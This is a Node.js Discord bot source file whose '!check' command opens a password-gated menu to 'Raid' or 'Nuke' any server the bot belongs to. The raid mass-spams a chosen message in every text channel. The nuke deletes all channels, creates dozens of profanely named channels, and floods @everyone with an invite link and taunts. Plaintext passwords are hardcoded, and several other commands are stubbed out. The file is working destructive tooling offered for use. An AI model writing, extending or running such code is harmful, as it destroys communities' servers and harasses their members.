const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!movebootser' || content === '!nukeback' || content === '!ate' || content === '!check') {
    // Your existing commands remain the same...
    if (content === '!movebootser') { /* ... */ }
    if (content === '!nukeback') { /* ... */ }
    if (content === '!ate') { /* ... */ }

    if (content === '!check') {
      const embed = new EmbedBuilder()
        .setColor('#00ff00')
        .setTitle('🔍 Remote Server Control')
        .setDescription('Select any server the bot is in and perform **Raid** or **Nuke**.\n\nPassword required.')
        .setFooter({ text: 'Only you can use this' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`check_start_${message.author.id}`)
          .setLabel('Start')
          .setStyle(ButtonStyle.Primary)
      );

      await message.reply({ embeds: [embed], components: [row] });
    }
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ 
        content: '❌ This interaction belongs to someone else.', 
        flags: MessageFlags.Ephemeral 
      });
    }

    // ====================== CHECK COMMAND ======================
    if (action === 'check') {

      // Start Button
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      // Password Modal
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) {
          return interaction.reply({ content: '❌ Bot is not in any servers.', flags: MessageFlags.Ephemeral });
        }

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id,
          description: `${g.memberCount} members`
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select target server')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password accepted. Select a server:',
          components: [new ActionRowBuilder().addComponents(select)],
          flags: MessageFlags.Ephemeral
        });

        userSessions.set(interaction.user.id, {});
      }

      // Server Select
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        await interaction.deferUpdate();
        const selectedGuildId = interaction.values[0];
        const guild = client.guilds.cache.get(selectedGuildId);
        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

        userSessions.set(interaction.user.id, { guildId: selectedGuildId });

        const actionSelect = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([
            { label: '🔥 Raid', value: 'raid' },
            { label: '☢️ Nuke', value: 'nuke' }
          ]);

        await interaction.editReply({
          content: `**Selected Server:** ${guild.name}\nChoose action:`,
          components: [new ActionRowBuilder().addComponents(actionSelect)]
        });
      }

      // Action Select
      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        await interaction.deferUpdate();
        const selectedAction = interaction.values[0];
        const session = userSessions.get(interaction.user.id);

        if (selectedAction === 'raid') {
          const modal = new ModalBuilder()
            .setCustomId(`check_raid_modal_${interaction.user.id}`)
            .setTitle('Raid Message');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('raid_message')
              .setLabel('Message to spam')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
          ));
          return await interaction.showModal(modal);
        }

        if (selectedAction === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Confirm Nuke');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password')
              .setLabel('Nuke Password')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ));
          return await interaction.showModal(modal);
        }
      }

      // Raid Modal
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_raid_modal_')) {
        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
        // ... raid logic (same as before)
        const raidMessage = interaction.fields.getTextInputValue('raid_message');
        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.editReply({ content: '❌ Session expired.' });

        const channels = guild.channels.cache.filter(c => c.type === 0);
        for (const ch of channels.values()) {
          for (let i = 0; i < 5; i++) ch.send(raidMessage).catch(() => {});
        }
        await interaction.editReply({ content: `✅ Raid sent in ${channels.size} channels.` });
        userSessions.delete(interaction.user.id);
      }

      // ==================== FIXED NUKE (Most Stable) ====================
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) {
          return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
        }

        await interaction.deferReply({ flags: MessageFlags.Ephemeral });

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.editReply({ content: '❌ Session expired.' });

        await interaction.editReply({ content: `☢️ Starting full nuke on **${guild.name}**...` });

        try {
          // Delete all channels
          await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });
          for (const channel of guild.channels.cache.values()) {
            await channel.delete().catch(() => {});
          }

          // Create channels with delay
          await interaction.followUp({ content: '🔨 Creating FUCKED BY FAME channels...', flags: MessageFlags.Ephemeral });
          const createdChannels = [];
          const delay = ms => new Promise(r => setTimeout(r, ms));

          for (let i = 0; i < 45; i++) {
            try {
              const chan = await guild.channels.create({
                name: `fucked-by-fame`,
                type: 0
              });
              createdChannels.push(chan);
              await delay(700);
            } catch (e) { break; }
          }

          // Spam
          await interaction.followUp({ content: `💥 Spamming @everyone in ${createdChannels.length} channels...`, flags: MessageFlags.Ephemeral });
          const invite = 'https://discord.gg/NANQMy3WnD';
          const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

          for (const channel of createdChannels) {
            for (let i = 0; i < 10; i++) {
              channel.send(spam).catch(() => {});
              if (i % 4 === 0) await delay(400);
            }
          }

          if (createdChannels.length > 0) {
            const last = createdChannels[createdChannels.length - 1];
            for (let i = 0; i < 20; i++) {
              last.send(`@everyone **BET$ UNLOCKED FAME** ${invite}`).catch(() => {});
            }
          }

          await interaction.followUp({ 
            content: `✅ **NUKE COMPLETE** — Created **${createdChannels.length}** channels`, 
            flags: MessageFlags.Ephemeral 
          });

        } catch (err) {
          console.error(err);
          await interaction.followUp({ content: '⚠️ Nuke failed due to rate limits.', flags: MessageFlags.Ephemeral });
        }

        userSessions.delete(interaction.user.id);
      }
    }

  } catch (error) {
    console.error('Interaction error:', error);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: '❌ Interaction failed. Try again.', flags: MessageFlags.Ephemeral });
      }
    } catch {}
  }
});

client.login(TOKEN);
